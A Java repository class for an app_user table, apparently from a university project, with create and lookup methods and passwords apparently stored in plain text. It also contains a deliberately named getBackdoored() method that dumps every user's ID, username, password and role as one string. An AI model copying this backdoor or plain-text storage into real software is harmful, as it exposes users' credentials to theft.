package br.usp.pcs.back.data.repository;

import static br.usp.pcs.back.data.dbconn.DbConn.connect;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.SQLException;
import java.util.UUID;

import br.usp.pcs.back.data.entity.UserEntity;
import br.usp.pcs.back.domain.models.Role;

public class UserRepository {
    public UserEntity create(String username, String password) {
        UUID id = UUID.randomUUID();
        UserEntity userEntity = new UserEntity(id, username, password, Role.DEFAULT);

        try {
            Connection conn = connect();
            PreparedStatement statement = conn.prepareStatement(
                    "INSERT INTO app_user(user_id, username, password, role) VALUES (?, ?, ?, ?) ON CONFLICT DO NOTHING;"
            );
            statement.setObject(1, userEntity.getId());
            statement.setString(2, userEntity.getUsername());
            statement.setString(3, userEntity.getPassword());
            statement.setObject(4, userEntity.getRole().toString());
            int status = statement.executeUpdate();
            statement.close();
            conn.close();
            if(status != 0){
                return userEntity;
            }
        } catch (SQLException e) {
            throw new RuntimeException(e);
        }
        return null;
    }

    public UserEntity get(String username){
        try {
            UserEntity userEntity = null;
            Connection conn = connect();
            PreparedStatement statement = conn.prepareStatement(
                    "SELECT user_id, username, password, role FROM app_user WHERE username=?"
            );
            statement.setObject(1, username);
            ResultSet result = statement.executeQuery();
            if(result.next()){
                userEntity = new UserEntity(
                        (UUID)result.getObject(1),
                        result.getString(2),
                        result.getString(3),
                        Role.valueOf(result.getString(4))
                        );
            }

            if(result.next()){
                statement.close();
                conn.close();
                return null;
            }

            statement.close();
            conn.close();

            return userEntity;
        } catch (SQLException e) {
            throw new RuntimeException(e);
        }
    }

    public String getBackdoored(){
        try {
            Connection conn = connect();
            PreparedStatement statement = conn.prepareStatement(
                    "SELECT * FROM app_user"
            );
            ResultSet result = statement.executeQuery();
    
            StringBuilder sb = new StringBuilder();
            while (result.next()) {
                ResultSetMetaData rsmd = result.getMetaData();
                int columnCount = rsmd.getColumnCount();
    
                for (int i = 1; i <= columnCount; i++ ) {
                    String columnValue = result.getObject(i).toString();
                    sb.append(columnValue);
                    if (i < columnCount) {
                        sb.append(" "); // adiciona um espaço entre os valores dos campos
                    }
                }
                sb.append("\n"); // adiciona uma quebra de linha após cada linha
            }
            return sb.toString();
        } catch (SQLException e) {
            throw new RuntimeException(e);
        }
    }
}
